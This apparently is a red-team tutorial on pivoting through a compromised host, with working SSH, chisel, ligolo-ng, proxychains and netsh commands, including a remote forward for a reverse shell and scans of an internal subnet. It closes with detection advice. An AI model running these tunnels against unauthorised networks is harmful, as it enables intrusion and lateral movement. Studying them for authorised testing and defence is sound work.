Pivoting & Tunnelling

2026-10-09 · 10 min read

A foothold rarely sits where the objective is. Pivoting is using that first host as a relay to reach networks and services you cannot touch directly; tunnelling is the plumbing that carries your tools' traffic through it. Get this right and a single beachhead becomes a route into every segment it can see.

The three forwards, and SOCKS

Every tunnelling tool is a variation on four primitives:

PrimitiveWhat it does
Local forwardA port on your box forwards to a host:port reachable from the pivot (reach one remote service)
Remote forwardA port on the pivot forwards back to you (expose your listener to the internal net — e.g. for a reverse shell)
Dynamic forward (SOCKS)A SOCKS proxy on your box; any tool can reach any host the pivot can — the workhorse
Relay / agentA purpose-built tunnel (chisel, ligolo) that gives you a SOCKS proxy or even a routable interface over one outbound connection

SSH tunnelling

When you have SSH access to or from the pivot, you need no extra tools. 

# dynamic (SOCKS) — then point tools through it (see proxychains)
ssh -D 1080 user@pivot
# local forward — reach an internal DB through the pivot
ssh -L 9000:10.10.20.5:5432 user@pivot
# remote forward — expose your local 4444 on the pivot for a reverse shell
ssh -R 4444:127.0.0.1:4444 user@pivot
# chain through two pivots with ProxyJump
ssh -J user@pivot1 user@pivot2

chisel — TCP/UDP tunnel over HTTP

When SSH is not available, chisel builds a tunnel over a single HTTP(S) connection — ideal through restrictive egress. Run a server on your box and a client on the pivot (or vice versa) to get a reverse SOCKS proxy. 

# on your box (attacker): listen, accept a reverse tunnel
chisel server -p 8080 --reverse
# on the pivot: connect back and expose a SOCKS proxy on your 1080
chisel client :8080 R:1080:socks

ligolo-ng — a routable interface

ligolo-ng is the modern favourite: instead of a SOCKS proxy you get a real tun interface, so every tool works natively with no proxychains and full ICMP/UDP. You add a route for the internal subnet and the agent on the pivot relays it. 

# attacker: start the proxy + tun interface
./proxy -selfcert
# pivot: run the agent connecting back
./agent -connect :11601
# in the ligolo console: start the tunnel, then add a route to the internal net
# (your OS routing sends 10.10.20.0/24 down the tun -> the pivot relays it)

proxychains — push existing tools through a SOCKS proxy

With a SOCKS proxy up (SSH -D, chisel, a C2 socks module), proxychains forces any dynamically-linked tool through it. 

# /etc/proxychains4.conf -> socks5 127.0.0.1 1080
proxychains nmap -sT -Pn -p 445,3389 10.10.20.0/24
proxychains nxc smb 10.10.20.5 -u user -p pass
# note: proxychains is TCP-only and no ICMP -> use -sT and skip host discovery

Windows pivots

  • netsh portproxy — a built-in local/remote forward on Windows (netsh interface portproxy add v4tov4 ...), survives as a quiet native relay.
  • C2 SOCKS — most frameworks expose a SOCKS proxy over the beacon (Sliver/CS), so you tunnel the whole toolset through the implant with no extra binary on disk.
  • SSH on Windows — the built-in OpenSSH client supports the same -L/-R/-D forwards.

Double pivots & hygiene

To reach a third network, chain: pivot A gives you a SOCKS to network B; an agent on a host in B gives you a SOCKS to network C (ligolo and chisel both support stacking). Keep each hop labelled, tear tunnels down when done, and remember that every relay you leave running is both an IOC and a dependency your session rests on.

Detection

  • Long-lived outbound connections from a server that should not initiate them, and internal hosts talking to each other on unusual ports.
  • chisel/ligolo binaries on disk or in memory; netsh portproxy entries; unexpected tun interfaces.
  • SOCKS-shaped traffic and port-scan fan-out from an internal host — a pivot scanning its neighbours.
  • Egress controls and east-west segmentation (see Network Segmentation) are what blunt pivoting in the first place.
